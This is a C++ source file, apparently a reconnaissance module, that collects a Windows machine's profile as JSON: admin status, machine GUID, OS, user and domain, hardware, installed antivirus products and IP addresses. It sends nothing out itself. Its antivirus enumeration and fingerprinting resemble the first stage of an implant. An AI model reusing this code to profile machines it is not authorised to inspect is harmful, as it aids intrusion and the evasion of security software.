#include "SysInfo.h"
#include "WmiHelpers.h"
#include "../external/nlohmann/json.hpp"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <time.h>

namespace recon {

// Helper to convert wstring to string
std::string ws2s(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

bool IsUserAdmin() {
    BOOL bIsAdmin = FALSE;
    PSID AdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &bIsAdmin);
        FreeSid(AdministratorsGroup);
    }
    return bIsAdmin == TRUE;
}

std::string GetMachineGuid() {
    HKEY hKey;
    char buffer[256];
    DWORD dwSize = sizeof(buffer);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)buffer, &dwSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return std::string(buffer);
        }
        RegCloseKey(hKey);
    }
    return "unknown";
}

std::string getSysInfo() {
    nlohmann::json info;
    WmiSession wmi;

    info["collected_at"] = [](){
        time_t now = time(0);
        char buf[80];
        struct tm tstruct;
        localtime_s(&tstruct, &now);
        strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tstruct);
        return std::string(buf);
    }();

    info["is_admin"] = IsUserAdmin();
    info["machine_guid"] = GetMachineGuid();

    try {
        // Operating System
        auto osResults = wmi.execQuery(L"SELECT * FROM Win32_OperatingSystem");
        if (!osResults.empty()) {
            info["os_caption"] = ws2s(osResults[0].getString(L"Caption"));
            info["os_build"] = ws2s(osResults[0].getString(L"BuildNumber"));
            info["architecture"] = ws2s(osResults[0].getString(L"OSArchitecture"));
            info["install_date"] = ws2s(osResults[0].getString(L"InstallDate"));
            info["boot_time"] = ws2s(osResults[0].getString(L"LastBootUpTime"));
            
            // Calc uptime
            unsigned __int64 upTimeMilli = GetTickCount64();
            info["uptime_seconds"] = upTimeMilli / 1000;
        }

        // Computer System
        auto csResults = wmi.execQuery(L"SELECT * FROM Win32_ComputerSystem");
        if (!csResults.empty()) {
            info["hostname"] = ws2s(csResults[0].getString(L"Name"));
            info["current_user"] = ws2s(csResults[0].getString(L"UserName"));
            info["manufacturer"] = ws2s(csResults[0].getString(L"Manufacturer"));
            info["model"] = ws2s(csResults[0].getString(L"Model"));
            info["total_physical_memory_gb"] = csResults[0].getUnsignedLongLong(L"TotalPhysicalMemory") / (1024 * 1024 * 1024);
            info["domain"] = ws2s(csResults[0].getString(L"Domain"));
        }

        // Processor
        auto cpuResults = wmi.execQuery(L"SELECT * FROM Win32_Processor");
        if (!cpuResults.empty()) {
            info["cpu_name"] = ws2s(cpuResults[0].getString(L"Name"));
            info["cpu_cores"] = cpuResults[0].getInt(L"NumberOfCores");
            info["cpu_logical_processors"] = cpuResults[0].getInt(L"NumberOfLogicalProcessors");
        }

        // BIOS
        auto biosResults = wmi.execQuery(L"SELECT * FROM Win32_BIOS");
        if (!biosResults.empty()) {
            info["bios_version"] = ws2s(biosResults[0].getString(L"SMBIOSBIOSVersion"));
            info["bios_date"] = ws2s(biosResults[0].getString(L"ReleaseDate"));
        }

        // Disks
        auto diskResults = wmi.execQuery(L"SELECT * FROM Win32_DiskDrive");
        nlohmann::json disks = nlohmann::json::array();
        for (auto& disk : diskResults) {
            nlohmann::json disk_info;
            disk_info["model"] = ws2s(disk.getString(L"Model"));
            disk_info["size_gb"] = disk.getUnsignedLongLong(L"Size") / (1024 * 1024 * 1024);
            disk_info["media_type"] = ws2s(disk.getString(L"MediaType"));
            disks.push_back(disk_info);
        }
        info["disks"] = disks;

        // Antivirus (ROOT\SecurityCenter2)
        try {
            WmiSession sc2(L"ROOT\\SecurityCenter2");
            auto avResults = sc2.execQuery(L"SELECT * FROM AntiVirusProduct");
            nlohmann::json avs = nlohmann::json::array();
            for (auto& av : avResults) {
                avs.push_back(ws2s(av.getString(L"displayName")));
            }
            info["antivirus"] = avs;
        } catch (...) {
             info["antivirus"] = nlohmann::json::array();
        }

        // Network IPs
        auto netResults = wmi.execQuery(L"SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE");
        nlohmann::json ips = nlohmann::json::array();
        for (auto& net : netResults) {
            VARIANT var;
            VariantInit(&var);
            if (SUCCEEDED(net.getRaw()->Get(L"IPAddress", 0, &var, 0, 0)) && var.vt == (VT_ARRAY | VT_BSTR)) {
                SAFEARRAY* sa = var.parray;
                LONG lbound = 0, ubound = 0;
                SafeArrayGetLBound(sa, 1, &lbound);
                SafeArrayGetUBound(sa, 1, &ubound);
                
                BSTR* bstrArray;
                if (SUCCEEDED(SafeArrayAccessData(sa, (void**)&bstrArray))) {
                    for (LONG i = 0; i <= (ubound - lbound); ++i) {
                        if (bstrArray[i] != NULL) {
                            ips.push_back(ws2s(bstrArray[i]));
                        }
                    }
                    SafeArrayUnaccessData(sa);
                }
            }
            VariantClear(&var);
        }
        info["ip_addresses"] = ips;

    } catch (const std::exception& e) {
        info["wmi_error"] = e.what();
    }

    return info.dump();
}

} // namespace recon
